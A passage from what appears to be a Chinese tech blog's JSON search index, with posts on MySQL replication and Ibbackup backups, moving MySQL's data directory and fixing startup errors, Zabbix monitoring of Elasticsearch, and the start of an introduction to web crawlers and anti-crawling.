1191 Relay_Log_File: vm02-relay-bin.000002 Relay_Log_Pos: 623 Relay_Master_Log_File: mysql-bin.000010 Slave_IO_Running: Yes Slave_SQL_Running: Yes Replicate_Do_DB: Replicate_Ignore_DB: Replicate_Do_Table: Replicate_Ignore_Table: Replicate_Wild_Do_Table: Replicate_Wild_Ignore_Table: Last_Errno: 0 Last_Error: Skip_Counter: 0 Exec_Master_Log_Pos: 1191 Relay_Log_Space: 778 Until_Condition: None Until_Log_File: Until_Log_Pos: 0 Master_SSL_Allowed: No Master_SSL_CA_File: Master_SSL_CA_Path: Master_SSL_Cert: Master_SSL_Cipher: Master_SSL_Key: Seconds_Behind_Master: 0Master_SSL_Verify_Server_Cert: No Last_IO_Errno: 0 Last_IO_Error: Last_SQL_Errno: 0 Last_SQL_Error: 2&#x3001;Ibbackup&#x5404;&#x79CD;&#x5927;&#x62DB;&#x90FD;&#x7528;&#x4E0A;&#x4E86;&#xFF0C;&#x65E0;&#x5948;slave&#x6570;&#x636E;&#x4E22;&#x5931;&#x8FC7;&#x591A;&#xFF0C;ibbackup&#xFF08;&#x9700;&#x8981;&#x94F6;&#x5B50;&#xFF09;&#x8BE5;&#x4F60;&#x767B;&#x573A;&#x4E86;&#x3002; Ibbackup&#x70ED;&#x5907;&#x4EFD;&#x5DE5;&#x5177;&#xFF0C;&#x662F;&#x4ED8;&#x8D39;&#x7684;&#x3002;xtrabackup&#x662F;&#x514D;&#x8D39;&#x7684;&#xFF0C;&#x529F;&#x80FD;&#x4E0A;&#x4E00;&#x6837;&#x3002; Ibbackup&#x5907;&#x4EFD;&#x671F;&#x95F4;&#x4E0D;&#x9501;&#x8868;&#xFF0C;&#x5907;&#x4EFD;&#x65F6;&#x5F00;&#x542F;&#x4E00;&#x4E2A;&#x4E8B;&#x52A1;&#xFF08;&#x76F8;&#x5F53;&#x4E8E;&#x505A;&#x4E00;&#x4E2A;&#x5FEB;&#x7167;&#xFF09;&#xFF0C;&#x7136;&#x540E;&#x4F1A;&#x8BB0;&#x5F55;&#x4E00;&#x4E2A;&#x70B9;&#xFF0C;&#x4E4B;&#x540E;&#x6570;&#x636E;&#x7684;&#x66F4;&#x6539;&#x4FDD;&#x5B58;&#x5728;ibbackup_logfile&#x6587;&#x4EF6;&#x91CC;&#xFF0C;&#x6062;&#x590D;&#x65F6;&#x628A;ibbackup_logfile &#x53D8;&#x5316;&#x7684;&#x6570;&#x636E;&#x518D;&#x5199;&#x5165;&#x5230;ibdata&#x91CC;&#x3002; Ibbackup &#x53EA;&#x5907;&#x4EFD;&#x6570;&#x636E;&#xFF08; ibdata&#x3001;.ibd &#xFF09;&#xFF0C;&#x8868;&#x7ED3;&#x6784;.frm&#x4E0D;&#x5907;&#x4EFD;&#x3002;","raw":null,"content":null,"categories":[{"name":"数据库","slug":"数据库","permalink":"http://www.wangxin123.com/categories/数据库/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://www.wangxin123.com/tags/mysql/"}]},{"title":"MySQL数据目录更改及相关问题解决方案","slug":"MySQL数据目录更改及相关问题解决方案","date":"2017-01-12T14:22:00.000Z","updated":"2017-01-18T11:31:08.350Z","comments":true,"path":"2017/01/12/MySQL数据目录更改及相关问题解决方案/","link":"","permalink":"http://www.wangxin123.com/2017/01/12/MySQL数据目录更改及相关问题解决方案/","excerpt":"&#x6B65;&#x9AA4;&#x76F8;&#x5173;1&#x3001;&#x505C;&#x6389;MySQL&#x670D;&#x52A1;service mysql stop 2&#x3001;&#x628A;&#x65E7;&#x7684;&#x6570;&#x636E;&#x76EE;&#x5F55;/var/lib/mysql&#x5907;&#x4EFD;&#x5230;&#x65B0;&#x7684;&#x6570;&#x636E;&#x76EE;&#x5F55;/data/mysqlcp /var/lib/mysql /data -R 3&#x3001;&#x7ED9;mysql&#x7EC4;&#x7684;mysql&#x7528;&#x6237;&#x8D4B;&#x4E88;&#x65B0;&#x7684;&#x6570;&#x636E;&#x76EE;&#x5F55;&#x7684;&#x6743;&#x9650;chown -R mysql:mysql /data/mysql 4&#x3001;&#x4FEE;&#x6539;my.cnfdatadir=/var/lib/mysql&#xFF0C;&#x6539;&#x4E3A;datadir=/data/mysql 5&#x3001;&#x5982;&#x679C;mysql&#x4E8B;&#x5148;&#x4E3A;&#x624B;&#x52A8;&#x5B89;&#x88C5;&#xFF0C;&#x8FD8;&#x9700;&#x4FEE;&#x6539;MySQL&#x542F;&#x52A8;&#x811A;&#x672C;/etc/init.d/mysqldatadir=/data/mysql 6&#x3001;&#x91CD;&#x542F;MySQL&#x670D;&#x52A1;service mysql restart","keywords":null,"text":"&#x6B65;&#x9AA4;&#x76F8;&#x5173;1&#x3001;&#x505C;&#x6389;MySQL&#x670D;&#x52A1;service mysql stop 2&#x3001;&#x628A;&#x65E7;&#x7684;&#x6570;&#x636E;&#x76EE;&#x5F55;/var/lib/mysql&#x5907;&#x4EFD;&#x5230;&#x65B0;&#x7684;&#x6570;&#x636E;&#x76EE;&#x5F55;/data/mysqlcp /var/lib/mysql /data -R 3&#x3001;&#x7ED9;mysql&#x7EC4;&#x7684;mysql&#x7528;&#x6237;&#x8D4B;&#x4E88;&#x65B0;&#x7684;&#x6570;&#x636E;&#x76EE;&#x5F55;&#x7684;&#x6743;&#x9650;chown -R mysql:mysql /data/mysql 4&#x3001;&#x4FEE;&#x6539;my.cnfdatadir=/var/lib/mysql&#xFF0C;&#x6539;&#x4E3A;datadir=/data/mysql 5&#x3001;&#x5982;&#x679C;mysql&#x4E8B;&#x5148;&#x4E3A;&#x624B;&#x52A8;&#x5B89;&#x88C5;&#xFF0C;&#x8FD8;&#x9700;&#x4FEE;&#x6539;MySQL&#x542F;&#x52A8;&#x811A;&#x672C;/etc/init.d/mysqldatadir=/data/mysql 6&#x3001;&#x91CD;&#x542F;MySQL&#x670D;&#x52A1;service mysql restart &#x95EE;&#x9898;&#x76F8;&#x5173;&#x6570;&#x636E;&#x8FC1;&#x79FB;&#x540E;&#xFF0C;&#x670D;&#x52A1;&#x542F;&#x52A8;&#x5931;&#x8D25;&#xFF0C;&#x62A5;&#x5982;&#x4E0B;&#x9519;&#x8BEF;1The server quit without updating PID file &#x539F;&#x56E0;&#xFF1A;&#x53EF;&#x80FD;datadir&#x76EE;&#x5F55;&#x4FEE;&#x6539;&#x6216;&#x5176;&#x4ED6;&#x539F;&#x56E0;&#xFF0C;mysql&#x7528;&#x6237;&#x6CA1;&#x6709;PID&#x6216;&#x5176;&#x4ED6;&#x76F8;&#x5173;&#x6587;&#x4EF6;&#x7684;&#x6743;&#x9650;&#x65B9;&#x6848;&#xFF1A;&#x76F8;&#x5173;&#x76EE;&#x5F55;&#x6267;&#x884C; &#x201C;chown -R mysql:mysql /data/mysql&#x201D;&#xFF0C;&#x7136;&#x540E;&#x91CD;&#x542F;&#x670D;&#x52A1;&#x3002; &#x539F;&#x56E0;&#xFF1A;&#x53EF;&#x80FD;&#x5DF2;&#x5B58;&#x5728;mysql&#x8FDB;&#x7A0B;&#x65B9;&#x6848;&#xFF1A;&#x6267;&#x884C;&#x201D;ps -ef|grep mysqld&#x201D;&#xFF0C;&#x7528;&#x201D;kill -9 &#x8FDB;&#x7A0B;&#x53F7;&#x201D;&#x6740;&#x6B7B;&#x5DF2;&#x7ECF;&#x53D1;&#x73B0;&#x7684;&#x8FDB;&#x7A0B;&#xFF0C;&#x7136;&#x540E;&#x91CD;&#x542F;&#x670D;&#x52A1;&#x3002; &#x539F;&#x56E0;&#xFF1A;&#x53EF;&#x80FD;&#x7B2C;&#x4E8C;&#x6B21;&#x91CD;&#x88C5;mysql&#xFF0C;&#x6B8B;&#x4F59;&#x6570;&#x636E;&#x5F71;&#x54CD;&#x4E86;&#x670D;&#x52A1;&#x542F;&#x52A8;&#x65B9;&#x6848;&#xFF1A;&#x53BB;mysql&#x6570;&#x636E;&#x76EE;&#x5F55;/data&#x770B;&#x770B;&#xFF0C;&#x5982;&#x679C;&#x5B58;&#x5728;mysql-bin.index&#xFF0C;&#x5148;&#x5907;&#x4EFD;&#x518D;&#x5220;&#x9664;&#x8BD5;&#x8BD5;&#x3002;&#x6216;&#x8005;&#x7528;&#x201D;find / -name &#x2018;mysql&#x2018;&#x201C;&#x67E5;&#x627E;&#x6B8B;&#x4F59;&#x6570;&#x636E;&#xFF0C;&#x7136;&#x540E;&#x5220;&#x9664;&#x3002; &#x539F;&#x56E0;&#xFF1A;selinux&#x95EE;&#x9898;&#xFF0C;&#x5982;&#x679C;&#x662F;centos&#x7CFB;&#x7EDF;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x9ED8;&#x8BA4;&#x5F00;&#x542F;selinux&#x65B9;&#x6848;&#xFF1A;&#x7F16;&#x8F91; /etc/selinux/config&#xFF0C;&#x628A; SELINUX=enforcing &#x6539;&#x4E3A; SELINUX=disabled &#xFF0C;&#x7136;&#x540E;&#x91CD;&#x542F;&#x670D;&#x52A1;&#x3002; &#x539F;&#x56E0;&#xFF1A;skip-federated&#x5B57;&#x6BB5;&#x95EE;&#x9898;&#x65B9;&#x6848;&#xFF1A;&#x68C0;&#x67E5; my.cnf &#x6587;&#x4EF6;&#x662F;&#x5426;&#x6709;&#x6CA1;&#x88AB;&#x6CE8;&#x91CA;&#x6389;&#x7684; skip-federated &#x5B57;&#x6BB5;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x5C31;&#x6CE8;&#x91CA;&#x6389;&#x3002; &#x539F;&#x56E0;&#xFF1A;&#x5176;&#x4ED6;&#x672A;&#x77E5;&#x9519;&#x8BEF;&#x65B9;&#x6848;&#xFF1A;&#x5728; my.cnf &#x914D;&#x7F6E;&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#xFF0C;log-error=/data/mysql/mysqld.log&#xFF0C;&#x518D;&#x6B21;&#x91CD;&#x542F;&#xFF0C;&#x5982;&#x679C;&#x5931;&#x8D25;&#x67E5;&#x770B;&#x76F8;&#x5173;&#x65E5;&#x5FD7;&#x3002;","raw":null,"content":null,"categories":[{"name":"数据库","slug":"数据库","permalink":"http://www.wangxin123.com/categories/数据库/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://www.wangxin123.com/tags/mysql/"}]},{"title":"zabbix监控Elasticsearch集群","slug":"zabbix监控Elasticsearch集群","date":"2017-01-05T10:24:17.000Z","updated":"2017-01-18T09:43:37.433Z","comments":true,"path":"2017/01/05/zabbix监控Elasticsearch集群/","link":"","permalink":"http://www.wangxin123.com/2017/01/05/zabbix监控Elasticsearch集群/","excerpt":"&#x672C;&#x8282;&#x4EE5; zabbix &#x4E3A;&#x4F8B;&#xFF0C;&#x4ECB;&#x7ECD;&#x5982;&#x4F55;&#x4F7F;&#x7528;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x5B8C;&#x6210; Elasticsearch &#x7684;&#x76D1;&#x63A7;&#x62A5;&#x8B66;&#x3002; github &#x4E0A;&#x6709;&#x597D;&#x51E0;&#x4E2A;&#x7248;&#x672C;&#x7684; ESZabbix &#x4ED3;&#x5E93;&#xFF0C;&#x90FD;&#x6E90;&#x81EA; Elastic &#x516C;&#x53F8;&#x5458;&#x5DE5; untergeek &#x6700;&#x65E9;&#x7684;&#x8D21;&#x732E;&#x3002;&#x4F46;&#x662F;&#x5F53;&#x65F6; Elasticsearch &#x8FD8;&#x6CA1;&#x6709;&#x5B98;&#x65B9; python &#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x6240;&#x4EE5;&#x76D1;&#x63A7;&#x7A0B;&#x5E8F;&#x90FD;&#x662F;&#x7528;&#x7684;&#x662F; pyes &#x5E93;&#x3002;&#x5BF9;&#x4E8E;&#x6700;&#x65B0;&#x7248;&#x7684; ES &#x6765;&#x8BF4;&#xFF0C;&#x5DF2;&#x7ECF;&#x4E0D;&#x63A8;&#x8350;&#x4F7F;&#x7528;&#x4E86;&#x3002; GitHub &#x5730;&#x5740;&#x89C1;&#xFF1A;https://github.com/Wasim37/zabbix-es &#x5B89;&#x88C5;&#x914D;&#x7F6E;&#x4ED3;&#x5E93;&#x4E2D;&#x5305;&#x62EC;&#x4E09;&#x4E2A;&#x6587;&#x4EF6;&#xFF1A;1&#x3001;ESzabbix.py2&#x3001;ESzabbix.userparm3&#x3001;ESzabbix_templates.xml &#x5176;&#x4E2D;&#xFF0C;&#x524D;&#x4E24;&#x4E2A;&#x6587;&#x4EF6;&#x9700;&#x8981;&#x5206;&#x53D1;&#x5230;&#x6BCF;&#x4E2A; ES &#x8282;&#x70B9;&#x4E0A;&#x3002;&#x5982;&#x679C;&#x8282;&#x70B9;&#x4E0A;&#x8FD0;&#x884C;&#x7684;&#x662F; yum &#x5B89;&#x88C5;&#x7684; zabbix&#xFF0C;&#x4E8C;&#x8005;&#x7684;&#x9ED8;&#x8BA4;&#x4F4D;&#x7F6E;&#x5E94;&#x8BE5;&#x5206;&#x522B;&#x662F;&#xFF1A;12/etc/zabbix/zabbix_externalscripts/ESzabbix.py/etc/zabbix/agent_include/ESzabbix.userparm","keywords":null,"text":"&#x672C;&#x8282;&#x4EE5; zabbix &#x4E3A;&#x4F8B;&#xFF0C;&#x4ECB;&#x7ECD;&#x5982;&#x4F55;&#x4F7F;&#x7528;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x5B8C;&#x6210; Elasticsearch &#x7684;&#x76D1;&#x63A7;&#x62A5;&#x8B66;&#x3002; github &#x4E0A;&#x6709;&#x597D;&#x51E0;&#x4E2A;&#x7248;&#x672C;&#x7684; ESZabbix &#x4ED3;&#x5E93;&#xFF0C;&#x90FD;&#x6E90;&#x81EA; Elastic &#x516C;&#x53F8;&#x5458;&#x5DE5; untergeek &#x6700;&#x65E9;&#x7684;&#x8D21;&#x732E;&#x3002;&#x4F46;&#x662F;&#x5F53;&#x65F6; Elasticsearch &#x8FD8;&#x6CA1;&#x6709;&#x5B98;&#x65B9; python &#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x6240;&#x4EE5;&#x76D1;&#x63A7;&#x7A0B;&#x5E8F;&#x90FD;&#x662F;&#x7528;&#x7684;&#x662F; pyes &#x5E93;&#x3002;&#x5BF9;&#x4E8E;&#x6700;&#x65B0;&#x7248;&#x7684; ES &#x6765;&#x8BF4;&#xFF0C;&#x5DF2;&#x7ECF;&#x4E0D;&#x63A8;&#x8350;&#x4F7F;&#x7528;&#x4E86;&#x3002; GitHub &#x5730;&#x5740;&#x89C1;&#xFF1A;https://github.com/Wasim37/zabbix-es &#x5B89;&#x88C5;&#x914D;&#x7F6E;&#x4ED3;&#x5E93;&#x4E2D;&#x5305;&#x62EC;&#x4E09;&#x4E2A;&#x6587;&#x4EF6;&#xFF1A;1&#x3001;ESzabbix.py2&#x3001;ESzabbix.userparm3&#x3001;ESzabbix_templates.xml &#x5176;&#x4E2D;&#xFF0C;&#x524D;&#x4E24;&#x4E2A;&#x6587;&#x4EF6;&#x9700;&#x8981;&#x5206;&#x53D1;&#x5230;&#x6BCF;&#x4E2A; ES &#x8282;&#x70B9;&#x4E0A;&#x3002;&#x5982;&#x679C;&#x8282;&#x70B9;&#x4E0A;&#x8FD0;&#x884C;&#x7684;&#x662F; yum &#x5B89;&#x88C5;&#x7684; zabbix&#xFF0C;&#x4E8C;&#x8005;&#x7684;&#x9ED8;&#x8BA4;&#x4F4D;&#x7F6E;&#x5E94;&#x8BE5;&#x5206;&#x522B;&#x662F;&#xFF1A;12/etc/zabbix/zabbix_externalscripts/ESzabbix.py/etc/zabbix/agent_include/ESzabbix.userparm &#x7136;&#x540E;&#x5728;&#x5404;&#x8282;&#x70B9;&#x5B89;&#x88C5;&#x8FD0;&#x884C; ESzabbix.py &#x6240;&#x9700;&#x7684; python &#x5E93;&#x4F9D;&#x8D56;&#xFF1A; 12yum install -y python-pbr python-pip python-urllib3 python-unittest2pip install elasticsearch &#x5B89;&#x88C5;&#x6210;&#x529F;&#x540E;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x8BD5;&#x8FD0;&#x884C;&#x4E0B;&#x9762;&#x8FD9;&#x884C;&#x547D;&#x4EE4;&#xFF0C;&#x770B;&#x770B;&#x547D;&#x4EE4;&#x8F93;&#x51FA;&#x662F;&#x5426;&#x6B63;&#x5E38;&#xFF1A;12/etc/zabbix/zabbix_externalscripts/ESzabbix.py cluster status0 &#x6700;&#x540E;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x662F; zabbix server &#x4E0A;&#x7684;&#x6A21;&#x677F;&#x6587;&#x4EF6;&#xFF0C;&#x4E0D;&#x8FC7;&#x5728;&#x5BFC;&#x5165;&#x6A21;&#x677F;&#x4E4B;&#x524D;&#xFF0C;&#x8FD8;&#x9700;&#x8981;&#x5148;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x6570;&#x503C;&#x6620;&#x5C04;&#xFF0C;&#x56E0;&#x4E3A;&#x5728;&#x6A21;&#x677F;&#x4E2D;&#xFF0C;&#x8BBE;&#x7F6E;&#x4E86;&#x96C6;&#x7FA4;&#x72B6;&#x6001;&#x7684;&#x89E6;&#x53D1;&#x62A5;&#x8B66;&#xFF0C;&#x6CA1;&#x6709;&#x6620;&#x5C04;&#x7684;&#x8BDD;&#xFF0C;&#x62A5;&#x8B66;&#x77ED;&#x4FE1;&#x53EA;&#x6709; 0, 1, 2 &#x6570;&#x5B57;&#x4E0D;&#x662F;&#x5F88;&#x6613;&#x61C2;&#x3002; &#x521B;&#x5EFA;&#x6570;&#x503C;&#x6620;&#x5C04;&#xFF0C;&#x5728;&#x6D4F;&#x89C8;&#x5668;&#x767B;&#x5F55; zabbix-web&#xFF0C;&#x83DC;&#x5355;&#x680F;&#x7684; Zabbix Administration &#x4E2D;&#x9009;&#x62E9; General &#x5B50;&#x83DC;&#x5355;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x53F3;&#x4FA7;&#x4E0B;&#x62C9;&#x6846;&#x4E2D;&#x70B9;&#x51FB; Value Maping&#x3002; &#x5B8C;&#x6210;&#x4EE5;&#x540E;&#xFF0C;&#x5373;&#x53EF;&#x5728; Templates &#x9875;&#x4E2D;&#x901A;&#x8FC7; import &#x529F;&#x80FD;&#x5B8C;&#x6210;&#x5BFC;&#x5165; ESzabbix_templates.xml&#x3002; &#x5728;&#x7ED9; ES &#x5404;&#x8282;&#x70B9;&#x5E94;&#x7528;&#x65B0;&#x6A21;&#x677F;&#x4E4B;&#x524D;&#xFF0C;&#x9700;&#x8981;&#x7ED9;&#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A; {$NODENAME} &#x5B8F;&#xFF0C;&#x5177;&#x4F53;&#x503C;&#x4E3A;&#x8BE5;&#x8282;&#x70B9; elasticsearch.yml &#x4E2D;&#x7684; node.name &#x503C;&#x3002;&#x4ECE;&#x7EDF;&#x4E00;&#x914D;&#x7BA1;&#x7684;&#x89D2;&#x5EA6;&#xFF0C;&#x5EFA;&#x8BAE;&#x5927;&#x5BB6;&#x90FD;&#x8BBE;&#x7F6E;&#x4E3A; ip &#x5730;&#x5740;&#x3002; &#x6A21;&#x677F;&#x5E94;&#x7528;&#x5BFC;&#x5165;&#x5B8C;&#x6210;&#x540E;&#xFF0C;zabbix &#x91CC;&#x591A;&#x51FA;&#x6765;&#x4E09;&#x4E2A;&#x53EF;&#x7528;&#x6A21;&#x677F;&#xFF1A; Elasticsearch Node Cache &#x5176;&#x4E2D;&#x5305;&#x62EC;&#x4E24;&#x4E2A; Application&#xFF1A;ES Cache &#x548C; ES Node&#x3002;&#x5206;&#x522B;&#x6709; Node Field Cache Size, Node Filter Cache Size &#x548C; Node Storage Size, Records indexed per second &#x5171;&#x8BA1; 4 &#x4E2A; item &#x76D1;&#x63A7;&#x9879;&#x3002;&#x5728;&#x5B8C;&#x6210;&#x4E0A;&#x9762;&#x8BF4;&#x7684;&#x5B8F;&#x5B9A;&#x4E49;&#x540E;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x628A;&#x8FD9;&#x4E2A;&#x6A21;&#x677F;&#x5E94;&#x7528;&#x5230;&#x5404;&#x8282;&#x70B9;(&#x5373;&#x76D1;&#x63A7;&#x4E3B;&#x673A;)&#x4E0A;&#x4E86;&#x3002; Elasticsearch Service &#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x76D1;&#x63A7;&#x9879; Elasticsearch service status&#xFF0C;&#x505A;&#x8FDB;&#x7A0B;&#x76D1;&#x63A7;&#x7684;&#xFF0C;&#x4E5F;&#x5E94;&#x7528;&#x5230;&#x5404;&#x8282;&#x70B9;&#x4E0A;&#x3002; Elasticsearch Cluster &#x5305;&#x62EC; 11 &#x4E2A;&#x76D1;&#x63A7;&#x9879;&#xFF0C;&#x5982;&#x4E0B;&#x5217;&#x6240;&#x793A;&#x3002;&#x5176;&#x4E2D;&#xFF0C;ElasticSearch Cluster Status &#x8FD9;&#x4E2A;&#x76D1;&#x63A7;&#x9879;&#x8FDE;&#x5E26;&#x6709;&#x62A5;&#x8B66;&#x7684;&#x89E6;&#x53D1;&#x5668;&#xFF0C;&#x5E76;&#x5BF9;&#x5E94;&#x4E4B;&#x524D;&#x521B;&#x5EFA;&#x7684;&#x90A3;&#x4E2A; Value Map&#x3002;Cluster-wide records indexed per secondCluster-wide storage sizeElasticSearch Cluster StatusNumber of active primary shardsNumber of active shardsNumber of data nodesNumber of initializing shardsNumber of nodesNumber of relocating shardsNumber of unassigned shardsTotal number of records Elasticsearch Cluster&#x6A21;&#x677F;&#x4E0B;&#x90FD;&#x662F;&#x96C6;&#x7FA4;&#x603B;&#x4F53;&#x60C5;&#x51B5;&#x7684;&#x76D1;&#x63A7;&#x9879;&#xFF0C;&#x6240;&#x4EE5;&#xFF0C;&#x8FD0;&#x7528;&#x5728;&#x4E00;&#x53F0;&#x6709; ES &#x96C6;&#x7FA4;&#x8BFB;&#x53D6;&#x6743;&#x9650;&#x7684;&#x4E3B;&#x673A;&#x4E0A;&#x5373;&#x53EF;&#xFF0C;&#x6BD4;&#x5982; zabbix server&#x3002; zabbix&#x76D1;&#x63A7;&#x6210;&#x529F;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;grafana&#x4E0A;&#x8FDB;&#x884C;&#x76F8;&#x5173;&#x914D;&#x7F6E;&#xFF0C;&#x5C55;&#x793A;&#x56FE;&#x50CF;&#x3002;&#x4E0B;&#x9762;&#x662F;&#x6211;&#x521D;&#x6B65;&#x642D;&#x5EFA;&#x7684;&#x754C;&#x9762;&#xFF1A; &#x5176;&#x4ED6;untergeek &#x6700;&#x8FD1;&#x521A;&#x66F4;&#x65B0;&#x4E86;&#x4ED6;&#x7684;&#x4ED3;&#x5E93;&#xFF0C;&#x91CD;&#x6784;&#x4E86;&#x4E00;&#x4E2A; es_stats_zabbix &#x6A21;&#x5757;&#x7528;&#x4E8E; Zabbix &#x76D1;&#x63A7;&#xFF0C;&#x6709;&#x5174;&#x8DA3;&#x7684;&#x8BFB;&#x8005;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#xFF1A;https://github.com/untergeek/zabbix-grab-bag/blob/master/Elasticsearch/es_stats_zabbix.README.md","raw":null,"content":null,"categories":[{"name":"运维部署","slug":"运维部署","permalink":"http://www.wangxin123.com/categories/运维部署/"}],"tags":[{"name":"zabbix","slug":"zabbix","permalink":"http://www.wangxin123.com/tags/zabbix/"},{"name":"es","slug":"es","permalink":"http://www.wangxin123.com/tags/es/"}]},{"title":"爬虫、反爬虫、反反爬虫","slug":"爬虫、反爬虫、反反爬虫","date":"2016-12-21T10:53:00.000Z","updated":"2017-01-09T12:49:28.168Z","comments":true,"path":"2016/12/21/爬虫、反爬虫、反反爬虫/","link":"","permalink":"http://www.wangxin123.com/2016/12/21/爬虫、反爬虫、反反爬虫/","excerpt":"&#x6700;&#x8FD1;&#x722C;&#x53D6;&#x4E86;&#x767E;&#x4E07;&#x6570;&#x636E;&#xFF0C;&#x4EE5;&#x4E0B;&#x662F;&#x5B66;&#x4E60;&#x722C;&#x866B;&#x65F6;&#x6C47;&#x603B;&#x7684;&#x76F8;&#x5173;&#x77E5;&#x8BC6;&#x70B9; &#x4EC0;&#x4E48;&#x662F;&#x722C;&#x866B;&#x548C;&#x53CD;&#x722C;&#x866B; &#x722C;&#x866B; &#x2014;&#x2014; &#x4F7F;&#x7528;&#x4EFB;&#x4F55;&#x6280;&#x672F;&#x624B;&#x6BB5;&#x6279;&#x91CF;&#x83B7;&#x53D6;&#x7F51;&#x7AD9;&#x4FE1;&#x606F;&#x7684;&#x4E00;&#x79CD;&#x65B9;&#x5F0F;&#xFF0C;&#x5173;&#x952E;&#x5728;&#x6279;&#x91CF;&#x3002; &#x53CD;&#x722C;&#x866B; &#x2014;&#x2014; &#x4F7F;&#x7528;&#x4EFB;&#x4F55;&#x6280;&#x672F;&#x624B;&#x6BB5;&#xFF0C;&#x963B;&#x6B62;&#x522B;&#x4EBA;&#x6279;&#x91CF;&#x83B7;&#x53D6;&#x81EA;&#x5DF1;&#x7F51;&#x7AD9;&#x4FE1;&#x606F;&#x7684;&#x4E00;&#x79CD;&#x65B9;&#x5F0F;&#x3002;&#x5173;&#x952E;&#x4E5F;&#x5728;&#x4E8E;&#x6279;&#x91CF;&#x3002; &#x8BEF;&#x4F24; &#x2014;&#x2014; &#x5728;&#x53CD;&#x722C;&#x866B;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x9519;&#x8BEF;&#x7684;&#x5C06;&#x666E;&#x901A;&#x7528;&#x6237;&#x8BC6;&#x522B;&#x4E3A;&#x722C;&#x866B;&#x3002;&#x8BEF;&#x4F24;&#x7387;&#x9AD8;&#x7684;&#x53CD;&#x722C;&#x866B;&#x7B56;&#x7565;&#xFF0C;&#x6548;&#x679C;&#x518D;&#x597D;&#x4E5F;&#x4E0D;&#x80FD;&#x7528;&#x3002; &#x62E6;&#x622A; &#x2014;&#x2014; &#x6210;&#x529F;&#x5730;&#x963B;&#x6B62;&#x722C;&#x866B;&#x8BBF;&#x95EE;&#x3002;&#x901A;&#x5E38;&#x6765;&#x8BF4;&#xFF0C;&#x62E6;&#x622A;&#x7387;&#x8D8A;&#x9AD8;&#x7684;&#x7B56;&#x7565;&#xFF0C;&#x8BEF;&#x4F24;&#x7387;&#x5C31;&#x8D8A;&#x9AD8;&#xFF0C;&#x56E0;&#x6B64;&#x8981;&#x505A;&#x6743;&#x8861;&#x3002; &#x8D44;&#x6E90; &#x2014;&#x2014; &#x673A;&#x5668;&#x6210;&#x672C;&#x4E0E;&#x4EBA;&#x529B;&#x6210;&#x672C;&#x7684;&#x603B;&#x548C;&#x3002; &#x53CD;&#x4EC0;&#x4E48;&#x6837;&#x7684;&#x722C;&#x866B; &#x5E94;&#x5C4A;&#x6BD5;&#x4E1A;&#x751F;(&#x4E09;&#x6708;&#x4EFD;&#x722C;&#x866B;)&#x4E09;&#x6708;&#x4EFD;&#x722C;&#x866B;&#x901A;&#x5E38;&#x548C;&#x6BD5;&#x4E1A;&#x751F;(&#x672C;&#x79D1;&#x751F;&#x3001;&#x7855;&#x58EB;&#x3001;&#x535A;&#x58EB;&#x7B49;)&#x6709;&#x5173;&#xFF0C;&#x4ED6;&#x4EEC;&#x7684;&#x722C;&#x866B;&#x7B80;&#x5355;&#x7C97;&#x66B4;&#xFF0C;&#x4E3A;&#x4E86;&#x8BA9;&#x8BBA;&#x6587;&#x6709;&#x6570;&#x636E;&#x652F;&#x6491;&#xFF0C;&#x6839;&#x672C;&#x4E0D;&#x7BA1;&#x670D;&#x52A1;&#x5668;&#x538B;&#x529B;&#xFF0C;&#x52A0;&#x4E0A;&#x4EBA;&#x6570;&#x4E0D;&#x53EF;&#x9884;&#x6D4B;&#xFF0C;&#x5F88;&#x5BB9;&#x6613;&#x5F04;&#x6302;&#x7AD9;&#x70B9;&#x3002; &#x521B;&#x4E1A;&#x5C0F;&#x516C;&#x53F8;&#x6BCF;&#x5E74;&#x65B0;&#x589E;&#x7684;&#x521B;&#x4E1A;&#x516C;&#x53F8;&#x5F88;&#x591A;&#xFF0C;&#x7A0B;&#x5E8F;&#x5F00;&#x53D1;&#x5B8C;&#x540E;&#xFF0C;&#x7F3A;&#x5C11;&#x6570;&#x636E;&#x652F;&#x6491;&#xFF0C;&#x51FA;&#x4E8E;&#x516C;&#x53F8;&#x751F;&#x6B7B;&#x5B58;&#x4EA1;&#x7684;&#x8003;&#x8651;&#xFF0C;&#x4E0D;&#x65AD;&#x722C;&#x53D6;&#x6570;&#x636E;&#x3002;","keywords":null,"text":"&#x6700;&#x8FD1;&#x722C;&#x53D6;&#x4E86;&#x767E;&#x4E07;&#x6570;&#x636E;&#xFF0C;&#x4EE5;&#x4E0B;&#x662F;&#x5B66;&#x4E60;&#x722C;&#x866B;&#x65F6;&#x6C47;&#x603B;&#x7684;&#x76F8;&#x5173;&#x77E5;&#x8BC6;&#x70B9; &#x4EC0;&#x4E48;&#x662F;&#x722C;&#x866B;&#x548C;&#x53CD;&#x722C;&#x866B; &#x722C;&#x866B; &#x2014;&#x2014; &#x4F7F;&#x7528;&#x4EFB;&#x4F55;&#x6280;&#x672F;&#x624B;&#x6BB5;&#x6279;&#x91CF;&#x83B7;&#x53D6;&#x7F51;&#x7AD9;&#x4FE1;&#x606F;&#x7684;&#x4E00;&#x79CD;&#x65B9;&#x5F0F;&#xFF0C;&#x5173;&#x952E;&#x5728;&#x6279;&#x91CF;&#x3002; &#x53CD;&#x722C;&#x866B; &#x2014;&#x2014; 